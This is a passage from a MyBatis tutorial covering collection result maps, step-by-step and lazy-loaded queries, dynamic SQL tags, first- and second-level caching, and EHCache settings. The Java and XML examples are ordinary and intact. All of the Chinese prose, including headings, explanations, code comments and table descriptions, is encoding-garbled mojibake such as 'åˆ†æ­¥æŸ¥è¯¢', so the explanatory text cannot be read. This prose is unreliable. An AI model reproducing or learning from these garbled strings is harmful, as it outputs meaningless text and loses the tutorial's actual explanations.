type=\"Dept\">\n\t<id property=\"did\" column=\"did\"></id>\n\t<result property=\"deptName\" column=\"dept_name\"></result>\n\t<collection property=\"emps\" ofType=\"Emp\">\n\t\t<id property=\"eid\" column=\"eid\"></id>\n\t\t<result property=\"empName\" column=\"emp_name\"></result>\n\t\t<result property=\"age\" column=\"age\"></result>\n\t\t<result property=\"sex\" column=\"sex\"></result>\n\t\t<result property=\"email\" column=\"email\"></result>\n\t</collection>\n</resultMap>\n<!--Dept getDeptAndEmp(@Param(\"did\") Integer did);-->\n<select id=\"getDeptAndEmp\" resultMap=\"DeptAndEmpResultMap\">\n\tselect * from t_dept left join t_emp on t_dept.did = t_emp.did where t_dept.did = #{did}\n</select>\n```\n\n```java\n @Test\npublic void testGetEmpAndDept2(){\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    DeptMapper mapper = sqlSession.getMapper(DeptMapper.class);\n    Dept deptAndEmp = mapper.getDeptAndEmp(3);\n    System.out.println(\"deptAndEmp = \" + deptAndEmp);\n}\n```\n\n####  b.åˆ†æ­¥æŸ¥è¯¢\n\n#####  step1. æŸ¥è¯¢éƒ¨é—¨ä¿¡æ¯\n\n```java\n/**\n * é€šè¿‡åˆ†æ­¥æŸ¥è¯¢ï¼ŒæŸ¥è¯¢éƒ¨é—¨åŠå¯¹åº”çš„æ‰€æœ‰å‘˜å·¥ä¿¡æ¯\n * åˆ†æ­¥æŸ¥è¯¢ç¬¬ä¸€æ­¥ï¼šæŸ¥è¯¢éƒ¨é—¨ä¿¡æ¯\n */\nDept getDeptAndEmpByStepOne(@Param(\"did\") Integer did);\n```\n\n```xml\n<resultMap id=\"DeptAndEmpByStepOneResultMap\" type=\"Dept\">\n\t<id property=\"did\" column=\"did\"></id>\n\t<result property=\"deptName\" column=\"dept_name\"></result>\n\t<collection property=\"emps\"\n\t\t\t\tselect=\"com.jianjian.mapper.EmpMapper.getDeptAndEmpByStepTwo\" column=\"did\">\n  </collection>\n</resultMap>\n<!--Dept getDeptAndEmpByStepOne(@Param(\"did\") Integer did);-->\n<select id=\"getDeptAndEmpByStepOne\" resultMap=\"DeptAndEmpByStepOneResultMap\">\n\tselect * from t_dept where did = #{did}\n</select>\n```\n\n##### step2. æ ¹æ®éƒ¨é—¨idæŸ¥è¯¢éƒ¨é—¨ä¸­çš„æ‰€æœ‰å‘˜å·¥\n\n```java\n/**\n * é€šè¿‡åˆ†æ­¥æŸ¥è¯¢ï¼ŒæŸ¥è¯¢éƒ¨é—¨åŠå¯¹åº”çš„æ‰€æœ‰å‘˜å·¥ä¿¡æ¯\n * åˆ†æ­¥æŸ¥è¯¢ç¬¬äºŒæ­¥ï¼šæ ¹æ®éƒ¨é—¨idæŸ¥è¯¢éƒ¨é—¨ä¸­çš„æ‰€æœ‰å‘˜å·¥\n */\nList<Emp> getDeptAndEmpByStepTwo(@Param(\"did\") Integer did);\n```\n\n```xml\n<!--List<Emp> getDeptAndEmpByStepTwo(@Param(\"did\") Integer did);-->\n<select id=\"getDeptAndEmpByStepTwo\" resultType=\"Emp\">\n\tselect * from t_emp where did = #{did}\n</select>\n```\n\n### 4.å»¶è¿ŸåŠ è½½\n\n- lazyLoadingEnabledï¼šå»¶è¿ŸåŠ è½½çš„å…¨å±€å¼€å…³ã€‚å½“å¼€å¯æ—¶ï¼Œæ‰€æœ‰å…³è”å¯¹è±¡éƒ½ä¼šå»¶è¿ŸåŠ è½½  \n\n- aggressiveLazyLoadingï¼šè¦å®ç°å»¶è¿ŸåŠ è½½éœ€è®¾ç½®ä¸ºfalseï¼Œé»˜è®¤å€¼ä¸ºfalse\n\n  - å½“å¼€å¯æ—¶ï¼Œä»»ä½•æ–¹æ³•çš„è°ƒç”¨éƒ½ä¼šåŠ è½½è¯¥å¯¹è±¡çš„æ‰€æœ‰å±æ€§\n\n  - å¦åˆ™ï¼Œæ¯ä¸ªå±æ€§ä¼šæŒ‰éœ€åŠ è½½  \n\nåˆ†æ­¥æŸ¥è¯¢çš„ä¼˜ç‚¹ï¼šå¯ä»¥å®ç°å»¶è¿ŸåŠ è½½ï¼Œä½†æ˜¯å¿…é¡»åœ¨æ ¸å¿ƒé…ç½®æ–‡ä»¶ä¸­è®¾ç½®å…¨å±€é…ç½®ä¿¡æ¯ï¼š\n\n```xml\n<settings>\n  <!--å¼€å¯å»¶è¿ŸåŠ è½½-->\n  <setting name=\"lazyLoadingEnabled\" value=\"true\"/>\n</settings>\n\n<!--æ­¤æ—¶å°±å¯ä»¥å®ç°æŒ‰éœ€åŠ è½½ï¼Œè·å–çš„æ•°æ®æ˜¯ä»€ä¹ˆï¼Œå°±åªä¼šæ‰§è¡Œç›¸åº”çš„sql-->\n```\n\n```java\n@Test\npublic void getEmpAndDeptByStepOne() {\n\tSqlSession sqlSession = SqlSessionUtils.getSqlSession();\n\tEmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n\tEmp emp = mapper.getEmpAndDeptByStepOne(1);\n\tSystem.out.println(emp.getEmpName());\n}\n```\n\n- å¼€å¯å»¶è¿ŸåŠ è½½ï¼Œåªè¿è¡Œè·å–empçš„SQLè¯­å¥\n\n![](https://img.jwt1399.top/img/202205241959248.png)\n\n- å…³é—­å»¶è¿ŸåŠ è½½ï¼Œä¸¤æ¡SQLè¯­å¥éƒ½è¿è¡Œäº†\n\n![](https://img.jwt1399.top/img/202205241959995.png)\n\n```java\n@Test\npublic void getEmpAndDeptByStepOne() {\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n    Emp emp = mapper.getEmpAndDeptByStepOne(1);\n    System.out.println(emp.getEmpName());\n    System.out.println(\"----------------\");\n    System.out.println(emp.getDept());\n}\n```\n\n- å¼€å¯å»¶è¿ŸåŠ è½½ï¼Œéœ€è¦ç”¨åˆ°æŸ¥è¯¢deptçš„æ—¶å€™æ‰ä¼šè°ƒç”¨ç›¸åº”çš„SQLè¯­å¥\n\n![](https://img.jwt1399.top/img/202205241959629.png)\n\n- å…³é—­å»¶è¿ŸåŠ è½½ï¼ŒSQLè¯­å¥ä¼šå…ˆç›´æ¥å…¨éƒ¨æ‰§è¡Œï¼Œå†è·å–æ•°æ®\n\n![](https://img.jwt1399.top/img/202205241959150.png)\n\næœ‰çš„åŠŸèƒ½ä¸æƒ³è®¾ç½®å»¶è¿ŸåŠ è½½ï¼Œå¯é€šè¿‡associationå’Œcollectionä¸­çš„fetchTypeå±æ€§æ‰‹åŠ¨è®¾ç½®å½“å‰çš„åˆ†æ­¥æŸ¥è¯¢å»¶è¿ŸåŠ è½½æ•ˆæœ\n\n- fetchType=\"lazy\"    (å»¶è¿ŸåŠ è½½)\n- fetchType=\"eager\"  (ç«‹å³åŠ è½½)\n\n```xml\n<resultMap id=\"empAndDeptByStepResultMap\" type=\"Emp\">\n\t<id property=\"eid\" column=\"eid\"></id>\n\t<result property=\"empName\" column=\"emp_name\"></result>\n\t<result property=\"age\" column=\"age\"></result>\n\t<result property=\"sex\" column=\"sex\"></result>\n\t<result property=\"email\" column=\"email\"></result>\n\t<association property=\"dept\"\n\t\t\t\t select=\"com.jianjian.mapper.DeptMapper.getEmpAndDeptByStepTwo\"\n\t\t\t\t column=\"did\"\n\t\t\t\t fetchType=\"eager\">\n  </association>\n</resultMap>\n```\n\n## ä¹ã€åŠ¨æ€SQL\n\nMybatisæ¡†æ¶çš„åŠ¨æ€SQLæŠ€æœ¯æ˜¯ä¸€ç§æ ¹æ®ç‰¹å®šæ¡ä»¶åŠ¨æ€æ‹¼è£…SQLè¯­å¥çš„åŠŸèƒ½ï¼Œå®ƒå­˜åœ¨çš„æ„ä¹‰æ˜¯ä¸ºäº†è§£å†³æ‹¼æ¥SQLè¯­å¥å­—ç¬¦ä¸²æ—¶çš„ç—›ç‚¹é—®é¢˜\n\n### 1.if\n\nifæ ‡ç­¾å¯é€šè¿‡testå±æ€§ï¼ˆå³ä¼ é€’è¿‡æ¥çš„æ•°æ®ï¼‰çš„è¡¨è¾¾å¼è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥è¡¨è¾¾å¼çš„ç»“æœä¸ºtrueï¼Œåˆ™æ ‡ç­¾ä¸­çš„å†…å®¹ä¼šæ‰§è¡Œï¼›åä¹‹æ ‡ç­¾ä¸­çš„å†…å®¹ä¸ä¼šæ‰§è¡Œ\n\n```xml\n<!--List<Emp> getEmpByCondition(Emp emp);-->\n<select id=\"getEmpByCondition\" resultType=\"Emp\">\n\tselect * from t_emp where 1=1\n\t<if test=\"empName != null and empName !=''\">\n\t\tand emp_name = #{empName}\n\t</if>\n\t<if test=\"age != null and age !=''\">\n\t\tand age = #{age}\n\t</if>\n\t<if test=\"sex != null and sex !=''\">\n\t\tand sex = #{sex}\n\t</if>\n\t<if test=\"email != null and email !=''\">\n\t\tand email = #{email}\n\t</if>\n</select>\n```\n\n```java\n@Test\npublic void testGetEmpByCondition(){\n  SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n  EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n  List<Emp> empByCondition = mapper.getEmpByCondition(new Emp(null,\"å¼ ä¸‰\",null,null,null));\n  System.out.println(\"empByCondition = \" + empByCondition);\n}\n```\n\nåœ¨whereåé¢æ·»åŠ ä¸€ä¸ªæ’æˆç«‹æ¡ä»¶`1=1`ï¼Œè¿™ä¸ªæ’æˆç«‹æ¡ä»¶å¹¶ä¸ä¼šå½±å“æŸ¥è¯¢çš„ç»“æœï¼Œè¿™ä¸ª`1=1`å¯ä»¥ç”¨æ¥æ‹¼æ¥`and`è¯­å¥ï¼Œä¾‹å¦‚ï¼šå½“empNameä¸ºnullæ—¶\n\n- å¦‚æœä¸åŠ ä¸Šæ’æˆç«‹æ¡ä»¶ï¼Œåˆ™SQLè¯­å¥ä¸º`select * from t_emp where and age = ? and sex = ? and email = ?`ï¼Œæ­¤æ—¶`where`ä¼šä¸`and`è¿ç”¨ï¼ŒSQLè¯­å¥ä¼šæŠ¥é”™\n- å¦‚æœåŠ ä¸Šä¸€ä¸ªæ’æˆç«‹æ¡ä»¶ï¼Œåˆ™SQLè¯­å¥ä¸º`select * from t_emp where 1= 1 and age = ? and sex = ? and email = ?`ï¼Œæ­¤æ—¶ä¸æŠ¥é”™\n\n### 2.where\n\nwhereå’Œifä¸€èˆ¬ç»“åˆä½¿ç”¨\n\n- è‹¥whereæ ‡ç­¾ä¸­çš„ifæ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œåˆ™whereæ ‡ç­¾æ²¡æœ‰ä»»ä½•åŠŸèƒ½ï¼Œå³ä¸ä¼šæ·»åŠ whereå…³é”®å­—  \n- è‹¥whereæ ‡ç­¾ä¸­çš„ifæ¡ä»¶æ»¡è¶³ï¼Œåˆ™whereæ ‡ç­¾ä¼šè‡ªåŠ¨æ·»åŠ whereå…³é”®å­—ï¼Œå¹¶å°†æ¡ä»¶æœ€å‰æ–¹å¤šä½™çš„and/orå»æ‰\n\n```xml\n<!--List<Emp> getEmpByCondition(Emp emp);-->\n<select id=\"getEmpByCondition\" resultType=\"Emp\">\n\tselect * from t_emp\n\t<where>\n\t\t<if test=\"empName != null and empName !=''\">\n\t\t\temp_name = #{empName}\n\t\t</if>\n\t\t<if test=\"age != null and age !=''\">\n\t\t\tand age = #{age}\n\t\t</if>\n\t\t<if test=\"sex != null and sex !=''\">\n\t\t\tand sex = #{sex}\n\t\t</if>\n\t\t<if test=\"email != null and email !=''\">\n\t\t\tand email = #{email}\n\t\t</if>\n\t</where>\n</select>\n```\n\næ³¨æ„ï¼šwhereæ ‡ç­¾ä¸èƒ½å»æ‰æ¡ä»¶åå¤šä½™çš„and/or\n\n```xml\n<!--è¿™ç§ç”¨æ³•æ˜¯é”™è¯¯çš„ï¼Œåªèƒ½å»æ‰æ¡ä»¶å‰é¢çš„and/orï¼Œæ¡ä»¶åé¢çš„ä¸è¡Œ-->\n<where>\n  <if test=\"empName != null and empName !=''\">\n    emp_name = #{empName} and\n  </if>\n  <if test=\"age != null and age !=''\">\n    age = #{age}\n  </if>\n</where>\n```\n\n### 3.trim\n\ntrimç”¨äºå»æ‰æˆ–æ·»åŠ æ ‡ç­¾ä¸­çš„å†…å®¹  \n\n- prefixï¼šåœ¨trimæ ‡ç­¾ä¸­çš„å†…å®¹çš„å‰é¢æ·»åŠ æŸäº›å†…å®¹  \n- suffixï¼šåœ¨trimæ ‡ç­¾ä¸­çš„å†…å®¹çš„åé¢æ·»åŠ æŸäº›å†…å®¹ \n- prefixOverridesï¼šåœ¨trimæ ‡ç­¾ä¸­çš„å†…å®¹çš„å‰é¢å»æ‰æŸäº›å†…å®¹  \n- suffixOverridesï¼šåœ¨trimæ ‡ç­¾ä¸­çš„å†…å®¹çš„åé¢å»æ‰æŸäº›å†…å®¹\n\nè‹¥trimä¸­çš„æ ‡ç­¾éƒ½ä¸æ»¡è¶³æ¡ä»¶ï¼Œåˆ™trimæ ‡ç­¾æ²¡æœ‰ä»»ä½•æ•ˆæœï¼Œä¹Ÿå°±æ˜¯åªå‰©ä¸‹`select * from t_emp`\n\n```xml\n<!--List<Emp> getEmpByCondition(Emp emp);-->\n<select id=\"getEmpByCondition\" resultType=\"Emp\">\n\tselect * from t_emp\n\t<trim prefix=\"where\" suffixOverrides=\"and|or\">\n\t\t<if test=\"empName != null and empName !=''\">\n\t\t\temp_name = #{empName} and\n\t\t</if>\n\t\t<if test=\"age != null and age !=''\">\n\t\t\tage = #{age} and\n\t\t</if>\n\t\t<if test=\"sex != null and sex !=''\">\n\t\t\tsex = #{sex} or\n\t\t</if>\n\t\t<if test=\"email != null and email !=''\">\n\t\t\temail = #{email}\n\t\t</if>\n\t</trim>\n</select>\n```\n\n### 4.chooseã€whenã€otherwise\n\n- chooseã€whenã€otherwise ç›¸å½“äº if...else if...else\n- when è‡³å°‘è¦æœ‰ä¸€ä¸ªï¼Œotherwise è‡³å¤šåªæœ‰ä¸€ä¸ª\n\n```xml\n<!--List<Emp> getEmpListByChoose(Emp emp);-->\n<select id=\"getEmpByChoose\" resultType=\"Emp\">\n\tselect * from t_emp\n\t<where>\n\t\t<choose>\n\t\t\t<when test=\"empName != null and empName != ''\">\n\t\t\t\temp_name = #{empName}\n\t\t\t</when>\n\t\t\t<when test=\"age != null and age != ''\">\n\t\t\t\tage = #{age}\n\t\t\t</when>\n\t\t\t<when test=\"sex != null and sex != ''\">\n\t\t\t\tsex = #{sex}\n\t\t\t</when>\n\t\t\t<otherwise>\n\t\t\t\tdid = 1\n\t\t\t</otherwise>\n\t\t</choose>\n\t</where>\n</select>\n```\n\nç›¸å½“äº`if a else if b else if c else d`ï¼Œåªä¼šæ‰§è¡Œå…¶ä¸­ä¸€ä¸ª\n\n### 5.foreach\n\nå¯¹é›†åˆè¿›è¡Œéå†\n\nå±æ€§ï¼š  \n\n- collectionï¼šè®¾ç½®è¦å¾ªç¯çš„æ•°ç»„æˆ–é›†åˆ  \n- itemï¼šè¡¨ç¤ºé›†åˆæˆ–æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªæ•°æ®  \n- separatorï¼šè®¾ç½®å¾ªç¯ä½“ä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œåˆ†éš”ç¬¦å‰åé»˜è®¤æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œå¦‚` , `\n- openï¼šè®¾ç½®foreachæ ‡ç­¾ä¸­çš„å†…å®¹çš„å¼€å§‹ç¬¦  \n- closeï¼šè®¾ç½®foreachæ ‡ç­¾ä¸­çš„å†…å®¹çš„ç»“æŸç¬¦\n\næ‰¹é‡åˆ é™¤\n\n```xml\n<!--int deleteMoreByArray(@Param(\"eids\") Integer[] eids);-->\n<delete id=\"deleteMoreByArray\">\n\tdelete from t_emp where eid in\n\t<foreach collection=\"eids\" item=\"eid\" separator=\",\" open=\"(\" close=\")\">\n\t\t#{eid}\n\t</foreach>\n</delete>\n```\n```java\n@Test\npublic void deleteMoreByArray() {\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n    int result = mapper.deleteMoreByArray(new Integer[]{1,2,3});\n    System.out.println(result);\n}\n```\n\næ‰¹é‡æ·»åŠ \n\n```xml\n<!--int insertMoreByList(@Param(\"emps\") List<Emp> emps);-->\n<insert id=\"insertMoreByList\">\n\tinsert into t_emp values\n\t<foreach collection=\"emps\" item=\"emp\" separator=\",\">\n\t\t(null,#{emp.empName},#{emp.age},#{emp.sex},#{emp.email})\n\t</foreach>\n</insert>\n```\n```java\n@Test\npublic void insertMoreByList() {\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n    Emp emp1 = new Emp(null,\"a\",1,\"ç”·\",\"123@321.com\");\n    Emp emp2 = new Emp(null,\"b\",1,\"ç”·\",\"123@321.com\");\n    Emp emp3 = new Emp(null,\"c\",1,\"ç”·\",\"123@321.com\");\n    List<Emp> emps = Arrays.asList(emp1, emp2, emp3);\n    int result = mapper.insertMoreByList(emps);\n    System.out.println(result);\n}\n```\n\n### 6.sql\n\nsqlè¯­å¥å¯ä»¥è®°å½•ä¸€æ®µå…¬å…±sqlç‰‡æ®µï¼Œåœ¨ä½¿ç”¨çš„åœ°æ–¹é€šè¿‡includeæ ‡ç­¾è¿›è¡Œå¼•å…¥\n\n- å£°æ˜sqlç‰‡æ®µï¼š`<sql>`æ ‡ç­¾\n\n```xml\n<sql id=\"empColumns\">eid,emp_name,age,sex,email</sql>\n```\n\n- å¼•ç”¨sqlç‰‡æ®µï¼š`<include>`æ ‡ç­¾\n\n```xml\n<!--List<Emp> getEmpByCondition(Emp emp);-->\n<select id=\"getEmpByCondition\" resultType=\"Emp\">\n\tselect <include refid=\"empColumns\"></include> from t_emp\n</select>\n```\n\n## åã€MyBatisçš„ç¼“å­˜\n\n### 1.ä¸€çº§ç¼“å­˜\n\nä¸€çº§ç¼“å­˜æ˜¯**SqlSessionçº§åˆ«**çš„ï¼Œé€šè¿‡åŒä¸€ä¸ªSqlSessionæŸ¥è¯¢çš„æ•°æ®ä¼šè¢«ç¼“å­˜ï¼Œä¸‹æ¬¡æŸ¥è¯¢ç›¸åŒçš„æ•°æ®ï¼Œå°±ä¼šä»ç¼“å­˜ä¸­ç›´æ¥è·å–ï¼Œä¸ä¼šä»æ•°æ®åº“é‡æ–°è®¿é—®  \n\nä¸€çº§ç¼“å­˜å¤±æ•ˆçš„å››ç§æƒ…å†µï¼š  \n\n1. ä¸åŒçš„SqlSessionå¯¹åº”ä¸åŒçš„ä¸€çº§ç¼“å­˜  \n2. åŒä¸€ä¸ªSqlSessionä½†æ˜¯æŸ¥è¯¢æ¡ä»¶ä¸åŒ\n3. åŒä¸€ä¸ªSqlSessionä¸¤æ¬¡æŸ¥è¯¢æœŸé—´æ‰§è¡Œäº†ä»»ä½•ä¸€æ¬¡å¢åˆ æ”¹æ“ä½œ\n4. åŒä¸€ä¸ªSqlSessionä¸¤æ¬¡æŸ¥è¯¢æœŸé—´æ‰‹åŠ¨æ¸…ç©ºäº†ç¼“å­˜ `sqlSession.clearCache();`\n\n### 2.äºŒçº§ç¼“å­˜\n\näºŒçº§ç¼“å­˜æ˜¯**SqlSessionFactoryçº§åˆ«**ï¼Œé€šè¿‡åŒä¸€ä¸ªSqlSessionFactoryåˆ›å»ºçš„SqlSessionæŸ¥è¯¢çš„ç»“æœä¼šè¢«ç¼“å­˜ï¼›æ­¤åè‹¥å†æ¬¡æ‰§è¡Œç›¸åŒçš„æŸ¥è¯¢è¯­å¥ï¼Œç»“æœå°±ä¼šä»ç¼“å­˜ä¸­è·å–  \n\n**äºŒçº§ç¼“å­˜å¼€å¯çš„æ¡ä»¶**ï¼š\n\n1. åœ¨æ ¸å¿ƒé…ç½®æ–‡ä»¶ä¸­ï¼Œè®¾ç½®å…¨å±€é…ç½®å±æ€§cacheEnabled=\"true\"ï¼Œé»˜è®¤ä¸ºtrueï¼Œä¸éœ€è¦è®¾ç½®\n2. åœ¨mapperæ˜ å°„æ–‡ä»¶ä¸­è®¾ç½®æ ‡ç­¾`<cache />`\n3. äºŒçº§ç¼“å­˜å¿…é¡»åœ¨SqlSessionå…³é—­æˆ–æäº¤ä¹‹åæœ‰æ•ˆ\n   1. `sqlSession.close();`\n   2. `sqlSession.commit();`\n4. æŸ¥è¯¢çš„æ•°æ®æ‰€è½¬æ¢çš„å®ä½“ç±»ç±»å‹å¿…é¡»å®ç°åºåˆ—åŒ–çš„æ¥å£\n\n**äºŒçº§ç¼“å­˜å¤±æ•ˆçš„æƒ…å†µ**ï¼šä¸¤æ¬¡æŸ¥è¯¢ä¹‹é—´æ‰§è¡Œäº†ä»»æ„çš„å¢åˆ æ”¹ï¼Œä¼šä½¿ä¸€çº§å’ŒäºŒçº§ç¼“å­˜åŒæ—¶å¤±æ•ˆ\n\n**äºŒçº§ç¼“å­˜çš„ç›¸å…³é…ç½®**\n\nåœ¨mapperé…ç½®æ–‡ä»¶ä¸­æ·»åŠ çš„cacheæ ‡ç­¾å¯ä»¥è®¾ç½®ä¸€äº›å±æ€§\n\n- evictionå±æ€§ï¼šç¼“å­˜å›æ”¶ç­–ç•¥  \n  - LRUï¼ˆLeast Recently Usedï¼‰ â€“ æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„ï¼šç§»é™¤æœ€é•¿æ—¶é—´ä¸è¢«ä½¿ç”¨çš„å¯¹è±¡ã€‚  é»˜è®¤å€¼\n  - FIFOï¼ˆFirst in First outï¼‰ â€“ å…ˆè¿›å…ˆå‡ºï¼šæŒ‰å¯¹è±¡è¿›å…¥ç¼“å­˜çš„é¡ºåºæ¥ç§»é™¤å®ƒä»¬ã€‚  \n  - SOFT â€“ è½¯å¼•ç”¨ï¼šç§»é™¤åŸºäºåƒåœ¾å›æ”¶å™¨çŠ¶æ€å’Œè½¯å¼•ç”¨è§„åˆ™çš„å¯¹è±¡ã€‚  \n  - WEAK â€“ å¼±å¼•ç”¨ï¼šæ›´ç§¯æåœ°ç§»é™¤åŸºäºåƒåœ¾æ”¶é›†å™¨çŠ¶æ€å’Œå¼±å¼•ç”¨è§„åˆ™çš„å¯¹è±¡ã€‚\n- flushIntervalå±æ€§ï¼šåˆ·æ–°é—´éš”ï¼Œå•ä½æ¯«ç§’ã€‚é»˜è®¤æƒ…å†µæ˜¯ä¸è®¾ç½®ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰åˆ·æ–°é—´éš”ï¼Œç¼“å­˜ä»…ä»…è°ƒç”¨è¯­å¥ï¼ˆå¢åˆ æ”¹ï¼‰æ—¶åˆ·æ–°\n- sizeå±æ€§ï¼šå¼•ç”¨æ•°ç›®ï¼Œæ­£æ•´æ•°ã€‚ä»£è¡¨ç¼“å­˜æœ€å¤šå¯ä»¥å­˜å‚¨å¤šå°‘ä¸ªå¯¹è±¡ï¼Œå¤ªå¤§å®¹æ˜“å¯¼è‡´å†…å­˜æº¢å‡º\n- readOnlyå±æ€§ï¼šåªè¯»ï¼Œtrue/false\n  - trueï¼šåªè¯»ç¼“å­˜ï¼›ä¼šç»™æ‰€æœ‰è°ƒç”¨è€…è¿”å›ç¼“å­˜å¯¹è±¡çš„ç›¸åŒå®ä¾‹ã€‚å› æ­¤è¿™äº›å¯¹è±¡ä¸èƒ½è¢«ä¿®æ”¹ã€‚è¿™æä¾›äº†å¾ˆé‡è¦çš„æ€§èƒ½ä¼˜åŠ¿ã€‚  \n  - falseï¼šè¯»å†™ç¼“å­˜ï¼›ä¼šè¿”å›ç¼“å­˜å¯¹è±¡çš„æ‹·è´ï¼ˆé€šè¿‡åºåˆ—åŒ–ï¼‰ã€‚è¿™ä¼šæ…¢ä¸€äº›ï¼Œä½†æ˜¯å®‰å…¨ï¼Œå› æ­¤é»˜è®¤æ˜¯false\n\n### 3.ç¼“å­˜æŸ¥è¯¢é¡ºåº\n\n- å…ˆæŸ¥è¯¢äºŒçº§ç¼“å­˜ï¼Œå› ä¸ºäºŒçº§ç¼“å­˜ä¸­å¯èƒ½ä¼šæœ‰å…¶ä»–ç¨‹åºå·²ç»æŸ¥å‡ºæ¥çš„æ•°æ®ï¼Œå¯ä»¥æ‹¿æ¥ç›´æ¥ä½¿ç”¨  \n- å¦‚æœäºŒçº§ç¼“å­˜æ²¡æœ‰å‘½ä¸­ï¼Œå†æŸ¥è¯¢ä¸€çº§ç¼“å­˜  \n- å¦‚æœä¸€çº§ç¼“å­˜ä¹Ÿæ²¡æœ‰å‘½ä¸­ï¼Œåˆ™æŸ¥è¯¢æ•°æ®åº“  \n- SqlSessionå…³é—­ä¹‹åï¼Œä¸€çº§ç¼“å­˜ä¸­çš„æ•°æ®ä¼šå†™å…¥äºŒçº§ç¼“å­˜\n\n### 4.ä¸‰æ–¹ç¼“å­˜EHCache\n\n#### a .æ·»åŠ ä¾èµ–\n\n```xml\n<!-- Mybatis EHCacheæ•´åˆåŒ… -->\n<dependency>\n\t<groupId>org.mybatis.caches</groupId>\n\t<artifactId>mybatis-ehcache</artifactId>\n\t<version>1.2.1</version>\n</dependency>\n<!-- slf4jæ—¥å¿—é—¨é¢çš„ä¸€ä¸ªå…·ä½“å®ç° -->\n<dependency>\n\t<groupId>ch.qos.logback</groupId>\n\t<artifactId>logback-classic</artifactId>\n\t<version>1.2.3</version>\n</dependency>\n```\n\n#### b.åˆ›å»ºEHCacheçš„é…ç½®æ–‡ä»¶ehcache.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n<ehcache xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:noNamespaceSchemaLocation=\"../config/ehcache.xsd\">\n    <!-- ç£ç›˜ä¿å­˜è·¯å¾„ -->\n    <diskStore path=\"/Users/jianjian/ehcache\"/>\n    <defaultCache\n            maxElementsInMemory=\"1000\"\n            maxElementsOnDisk=\"10000000\"\n            eternal=\"false\"\n            overflowToDisk=\"true\"\n            timeToIdleSeconds=\"120\"\n            timeToLiveSeconds=\"120\"\n            diskExpiryThreadIntervalSeconds=\"120\"\n            memoryStoreEvictionPolicy=\"LRU\">\n    </defaultCache>\n</ehcache>\n```\n\nEHCacheé…ç½®æ–‡ä»¶è¯´æ˜\n\n| å±æ€§å                          | æ˜¯å¦å¿…é¡» | ä½œç”¨                                                         |\n| ------------------------------- | -------- | ------------------------------------------------------------ |\n| maxElementsInMemory             | æ˜¯       | åœ¨å†…å­˜ä¸­ç¼“å­˜çš„elementçš„æœ€å¤§æ•°ç›®                              |\n| maxElementsOnDisk               | æ˜¯       | åœ¨ç£ç›˜ä¸Šç¼“å­˜çš„elementçš„æœ€å¤§æ•°ç›®ï¼Œè‹¥æ˜¯0è¡¨ç¤ºæ— ç©·å¤§             |\n| eternal                         | æ˜¯       | è®¾å®šç¼“å­˜çš„elementsæ˜¯å¦æ°¸è¿œä¸è¿‡æœŸã€‚ å¦‚æœä¸ºtrueï¼Œåˆ™ç¼“å­˜çš„æ•°æ®å§‹ç»ˆæœ‰æ•ˆï¼Œ å¦‚æœä¸ºfalseé‚£ä¹ˆè¿˜è¦æ ¹æ®timeToIdleSecondsã€timeToLiveSecondsåˆ¤æ–­ |\n| overflowToDisk                  | æ˜¯       | è®¾å®šå½“å†…å­˜ç¼“å­˜æº¢å‡ºçš„æ—¶å€™æ˜¯å¦å°†è¿‡æœŸçš„elementç¼“å­˜åˆ°ç£ç›˜ä¸Š      |\n| timeToIdleSeconds               | å¦       | å½“ç¼“å­˜åœ¨EhCacheä¸­çš„æ•°æ®å‰åä¸¤æ¬¡è®¿é—®çš„æ—¶é—´è¶…è¿‡timeToIdleSecondsçš„å±æ€§å–å€¼æ—¶ï¼Œ è¿™äº›æ•°æ®ä¾¿ä¼šåˆ é™¤ï¼Œé»˜è®¤å€¼æ˜¯0,ä¹Ÿå°±æ˜¯å¯é—²ç½®æ—¶é—´æ— ç©·å¤§ |\n| timeToLiveSeconds               | å¦       | ç¼“å­˜elementçš„æœ‰æ•ˆç”Ÿå‘½æœŸï¼Œé»˜è®¤æ˜¯0.,ä¹Ÿå°±æ˜¯elementå­˜æ´»æ—¶é—´æ— ç©·å¤§ |\n| diskSpoolBufferSizeMB           | å¦       | DiskStore(ç£ç›˜ç¼“å­˜)çš„ç¼“å­˜åŒºå¤§å°ã€‚é»˜è®¤æ˜¯30MBã€‚æ¯ä¸ªCacheéƒ½åº”è¯¥æœ‰è‡ªå·±çš„ä¸€ä¸ªç¼“å†²åŒº |\n| diskPersistent                  | å¦       | åœ¨VMé‡å¯çš„æ—¶å€™æ˜¯å¦å¯ç”¨ç£ç›˜ä¿å­˜EhCacheä¸­çš„æ•°æ®ï¼Œé»˜è®¤æ˜¯false   |\n| diskExpiryThreadIntervalSeconds | å¦       | ç£ç›˜ç¼“å­˜çš„æ¸…ç†çº¿ç¨‹è¿è¡Œé—´éš”ï¼Œé»˜è®¤æ˜¯120ç§’ã€‚æ¯ä¸ª120sï¼Œ ç›¸åº”çš„çº¿ç¨‹ä¼šè¿›è¡Œä¸€æ¬¡EhCacheä¸­æ•°æ®çš„æ¸…ç†å·¥ä½œ |\n| memoryStoreEvictionPolicy       | å¦       | å½“å†…å­˜ç¼“å­˜è¾¾åˆ°æœ€å¤§ï¼Œæœ‰æ–°çš„elementåŠ å…¥çš„æ—¶å€™ï¼Œ ç§»é™¤ç¼“å­˜ä¸­elementçš„ç­–ç•¥ã€‚ 